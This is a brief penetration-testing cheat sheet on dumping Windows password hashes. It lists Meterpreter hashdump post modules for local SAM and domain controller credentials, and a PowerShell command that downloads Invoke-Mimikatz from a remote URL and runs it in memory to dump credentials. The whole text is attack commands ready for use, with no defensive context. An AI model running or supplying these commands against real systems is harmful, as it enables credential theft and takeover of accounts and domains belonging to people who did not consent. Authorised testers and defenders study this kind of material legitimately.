# Passwords - Dumping Hashes

#### Windows

```
run post/windows/gather/hashdump
```

Gather hashes with Meterpreter

Dump the local user accounts from the SAM database using the registry

```powershell
powershell "IEX (New-Object Net.WebClient).DownloadString('http://<invoke-mimkatz>'); Invoke-Mimikatz -DumpCreds"
```

Run Invoke-Mimikatz in memory with Powershell web cradle. You can add all arguments to the end of command

```
use post/windows/gather/credentials/domain_hashdump
```

Dump hashes from domain controller safely with Meterpreter
